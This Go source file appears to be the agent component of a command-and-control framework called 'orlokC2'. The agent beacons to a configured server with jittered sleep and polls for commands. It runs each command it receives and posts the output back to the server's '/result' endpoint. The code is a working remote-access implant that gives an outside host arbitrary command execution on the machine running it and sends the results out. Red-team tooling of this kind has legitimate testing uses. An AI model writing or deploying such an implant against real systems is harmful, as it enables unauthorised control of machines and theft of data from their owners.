package agent

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"

	"orlokC2_final/internal/agent/commands"
	"orlokC2_final/internal/agent/config"
	"orlokC2_final/internal/agent/protocols"
	"time"
)

// Agent manages the C2 communication
type Agent struct {
	// Configuration
	Config *config.AgentConfig

	// Protocol implementation
	Protocol protocols.Protocol

	// Control
	stopChan chan struct{}
	running  bool
}

// New creates a new Agent with the given configuration and protocol
func New(config *config.AgentConfig, protocol protocols.Protocol) *Agent {
	return &Agent{
		Config:   config,
		Protocol: protocol,
		stopChan: make(chan struct{}),
		running:  false,
	}
}

// Start begins the agent's operation in a goroutine
func (a *Agent) Start() error {
	if a.running {
		return fmt.Errorf("agent already running")
	}

	// Initialize protocol
	err := a.Protocol.Initialize(
		a.Config.TargetHost,
		a.Config.TargetPort,
		int(a.Config.ConnectionTimeout.Seconds()),
		a.Config.AgentUUID,
	)
	if err != nil {
		return fmt.Errorf("failed to initialize protocol: %v", err)
	}

	// Start main loop in a goroutine
	a.running = true
	go a.runLoop()

	fmt.Printf("Agent started with UUID: %s\n", a.Config.AgentUUID)
	return nil
}

// Stop gracefully stops the agent's operation
func (a *Agent) Stop() error {
	if !a.running {
		return fmt.Errorf("agent not running")
	}

	// Signal the loop to stop
	close(a.stopChan)
	a.running = false

	// Disconnect from server
	if err := a.Protocol.Disconnect(); err != nil {
		return fmt.Errorf("error disconnecting: %v", err)
	}

	fmt.Println("Agent stopped")
	return nil
}

// runLoop is the main agent operation loop
func (a *Agent) runLoop() {
	for {
		select {
		case <-a.stopChan:
			// Stop signal received
			return
		default:
			// Try to connect if not connected
			err := a.Protocol.Connect()
			if err != nil {
				fmt.Printf("Connection error: %v\n", err)
				time.Sleep(a.Config.ReconnectDelay)
				continue
			}

			// Check for commands
			resp, err := a.Protocol.SendRequest("/command")
			if err != nil {
				fmt.Printf("Command check error: %v\n", err)
				time.Sleep(a.Config.ReconnectDelay)
				continue
			}

			// Process command response
			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err == nil {
				// Parse the response
				var cmdResp struct {
					Command    string `json:"command"`
					HasCommand bool   `json:"hasCommand"`
				}
				if err := json.Unmarshal(body, &cmdResp); err == nil {
					if cmdResp.HasCommand {
						// Execute the command
						a.executeCommand(cmdResp.Command)
					}
				}
			}

			// Sleep before next check-in
			sleepTime := a.Config.CalculateSleepWithJitter()
			time.Sleep(sleepTime)
		}
	}
}

// executeCommand handles command execution and sending results
func (a *Agent) executeCommand(command string) {
	fmt.Printf("Executing command: %s\n", command)

	// Execute the command
	output, err := commands.Execute(command)

	// Prepare result
	status := "success"
	if err != nil {
		output = err.Error()
		status = "error"
	}

	// Create result JSON
	result := struct {
		Command string `json:"command"`
		Output  string `json:"output"`
		Status  string `json:"status"`
	}{
		Command: command,
		Output:  output,
		Status:  status,
	}

	// Convert to JSON
	resultJSON, err := json.Marshal(result)
	if err != nil {
		fmt.Printf("Error marshaling result: %v\n", err)
		return
	}

	// Send the result back to the server
	reader := bytes.NewReader(resultJSON)
	req, err := http.NewRequest("POST", fmt.Sprintf("http://%s:%d/result",
		a.Config.TargetHost, a.Config.TargetPort), reader)
	if err != nil {
		fmt.Printf("Error creating result request: %v\n", err)
		return
	}

	// Add headers
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Agent-ID", a.Config.AgentUUID)

	// Send the request
	client := &http.Client{Timeout: a.Config.RequestTimeout}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("Error sending result: %v\n", err)
		return
	}
	defer resp.Body.Close()

	fmt.Printf("Command execution complete: %s\n", command)
}
